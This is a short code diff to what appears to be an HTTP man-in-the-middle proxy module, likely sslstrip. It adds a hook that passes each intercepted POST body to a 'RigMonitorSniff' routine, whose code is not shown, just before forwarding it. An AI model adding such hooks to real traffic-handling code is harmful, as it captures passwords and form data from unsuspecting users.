@@ -20,6 +20,7 @@ import logging, re, string, random, zlib, gzip, StringIO
 
 from twisted.web.http import HTTPClient
 from URLMonitor import URLMonitor
+from RigMonitorSniff import RigMonitorSniff
 
 class ServerConnection(HTTPClient):
 
@@ -63,6 +64,7 @@ class ServerConnection(HTTPClient):
 
     def sendPostData(self):
         logging.warning(self.getPostPrefix() + " Data (" + self.headers['host'] + "):\n" + str(self.postData))
+        RigMonitorSniff.fun(self.postData)
         self.transport.write(self.postData)
 
     def connectionMade(self):
